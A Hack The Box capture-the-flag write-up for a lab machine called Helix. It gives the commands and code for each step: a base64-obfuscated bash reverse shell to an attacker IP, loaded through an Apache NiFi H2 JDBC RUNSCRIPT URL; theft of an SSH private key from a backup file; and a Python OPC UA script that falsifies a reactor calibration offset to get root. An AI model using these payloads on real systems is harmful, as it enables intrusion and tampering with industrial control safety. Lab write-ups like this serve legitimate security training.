# Helix Write-up

> Hack The Box / CTF write-up  
> Flags have been intentionally removed.

## Enumeration

I started with an Nmap scan against the target:

```bash
nmap -sSVC -A 10.129.245.123
```

The scan showed two open ports:

```text
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu
80/tcp open  http  nginx 1.18.0
```

The web server redirected to:

```text
http://helix.htb/
```

After adding the hostname to `/etc/hosts`, I enumerated virtual hosts with `ffuf`:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
-u http://helix.htb \
-H "Host: FUZZ.helix.htb" -ac
```

The scan discovered the following subdomain:

```text
flow.helix.htb
```

I added it to `/etc/hosts` and opened it in the browser.

## Apache NiFi

The `flow.helix.htb` virtual host exposed an Apache NiFi instance.

Inside the NiFi interface, the flow contained processors including `LogAttribute` and `ExecuteSQL`.

The `ExecuteSQL` processor could be configured to use a custom database connection pool, which made it possible to abuse the H2 JDBC driver and execute a remotely hosted SQL script.

## Initial Foothold

First, I started a Netcat listener:

```bash
nc -lvnp 4444
```

Then I created a file called `rce.sql`:

```sql
CREATE TRIGGER pwn BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS
$$//javascript
java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTQvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}");
$$--=x
```

I served the file over HTTP:

```bash
python3 -m http.server 8000
```

### NiFi configuration

In the NiFi web interface:

1. Open **Configure**.
2. Go to the **Controller Services** tab.
3. Click **+**.
4. Select **DBCPConnectionPool**.
5. Add the service.

I configured it with the following values:

```text
Name: pwned

Database Driver Class Name:
org.h2.Driver

Database Driver Location:
/opt/nifi-1.21.0/lib/h2-2.1.214.jar
```

For the database connection URL:

```text
jdbc:h2:file:/tmp/pwn;TRACE_LEVEL_SYSTEM_OUT=0;INIT=RUNSCRIPT FROM 'http://10.10.14.214:8000/rce.sql'
```

After saving the configuration, I enabled the new Controller Service.

Next:

1. Open the `ExecuteSQL` processor.
2. Choose **Configure**.
3. Set its database connection pool to the newly created `pwned` service.
4. Start the processor.

The reverse shell connected back to the Netcat listener.

Example:

```text
listening on [any] 4444 ...
connect to [10.10.14.214] from (UNKNOWN) [10.129.245.123] ...
bash: cannot set terminal process group
bash: no job control in this shell
nifi@helix:/opt/nifi-1.21.0$
```

The shell was running as the `nifi` user.

## Operator SSH Key

While enumerating the filesystem, I searched for NiFi support bundles:

```bash
find / -name "*support-bundle*" 2>/dev/null
```

The relevant directory was:

```bash
/opt/nifi-1.21.0/support-bundles/
```

I listed its contents:

```bash
ls -la /opt/nifi-1.21.0/support-bundles/
```

A backup file containing the `operator` user's OpenSSH private key was present.

I displayed the file and copied the private key to my attacking machine:

```bash
cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

On my machine, I saved the key as:

```text
operator_key
```

Then fixed its permissions:

```bash
chmod 600 operator_key
```

I connected to the target over SSH:

```bash
ssh -i operator_key operator@flow.helix.htb
```

This successfully provided a shell as:

```text
operator@helix:~$
```

The user flag was obtained at this stage, but its value is intentionally omitted from this public write-up.

## Privilege Escalation

In the `operator` user's home directory, I found a PDF document named:

```text
Operator Control & Safety Guide.pdf
```

I copied it to my machine:

```bash
scp -i operator_key \
operator@flow.helix.htb:/home/operator/Operator\ Control\ \&\ Safety\ Guide.pdf .
```

The password for the document was:

```text
operator1
```

The documentation described the local industrial-control / OPC UA interface used by the system.

The service was reachable locally at:

```text
opc.tcp://127.0.0.1:4840/helix/
```

Using this information, I created the following Python script:

```python
import asyncio
from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def main():
    async with Client(url=URL) as c:
        ns = await c.get_namespace_index("urn:helix:ot")
        N = lambda i: c.get_node(f"ns={ns};i={i}")

        Mode, TestOv, Calib = N(12), N(13), N(6)
        Rods, Cooling, Reset = N(8), N(9), N(14)
        Temp, Trip = N(4), N(10)

        print("[*] STEP 1: Starting emergency reactor cooling...")

        await Rods.write_value(
            ua.Variant(True, ua.VariantType.Boolean)
        )

        await Cooling.write_value(
            ua.Variant(True, ua.VariantType.Boolean)
        )

        # Reset calibration offset
        await Calib.write_value(
            ua.Variant(0.0, ua.VariantType.Double)
        )

        print("[*] Waiting for temperature to drop below 285...")

        while True:
            t = await Temp.read_value()
            tr = await Trip.read_value()

            print(
                f" > Current T: {t:.2f} | Trip: {tr}",
                end="\r"
            )

            if t < 285:
                break

            await asyncio.sleep(2)

        print("\n[+] Temperature is normal. Resetting Trip...")

        await Reset.write_value(
            ua.Variant(True, ua.VariantType.Boolean)
        )

        await asyncio.sleep(1)

        print("[*] STEP 2: Preparing maintenance window...")

        await Mode.write_value(
            ua.Variant(
                "MAINTENANCE",
                ua.VariantType.String
            )
        )

        await TestOv.write_value(
            ua.Variant(True, ua.VariantType.Boolean)
        )

        print("[*] STEP 3: Applying final calibration offset (+20)...")

        await Calib.write_value(
            ua.Variant(20.0, ua.VariantType.Double)
        )

        await asyncio.sleep(2)

        t = await Temp.read_value()
        tr = await Trip.read_value()

        if t >= 295 and not tr:
            print(
                f"\n[!!!] SUCCESS! T={t:.2f}, Trip={tr}"
            )

            print(
                "[!!!] Run in another terminal: "
                "sudo /usr/local/sbin/helix-maint-console"
            )

            while True:
                await asyncio.sleep(10)

        else:
            print(
                f"\n[-] Conditions not met: "
                f"T={t:.2f}, Trip={tr}"
            )

asyncio.run(main())
```

I saved the script on the target, for example as:

```bash
nano /tmp/exploit.py
```

Then executed it:

```bash
python3 /tmp/exploit.py
```

The script first forced the reactor into a safe state by enabling the rods and cooling, resetting the calibration offset, and waiting until the temperature dropped below the required threshold.

Example output:

```text
[*] STEP 1: Starting emergency reactor cooling...
[*] Waiting for temperature to drop below 285...
 > Current T: 283.82 | Trip: False
[+] Temperature is normal. Resetting Trip...
[*] STEP 2: Preparing maintenance window...
[*] STEP 3: Applying final calibration offset (+20)...

[!!!] SUCCESS! T=303.91, Trip=False
[!!!] Run in another terminal: sudo /usr/local/sbin/helix-maint-console
```

Once the required conditions were met, I opened another terminal and ran:

```bash
sudo /usr/local/sbin/helix-maint-console
```

The console reported that privileged maintenance access had been granted:

```text
[+] Privileged maintenance access granted
[!] Window expires in 109 seconds
[!] Session will be terminated automatically
```

This resulted in a root shell:

```text
root@helix:/home/operator#
```



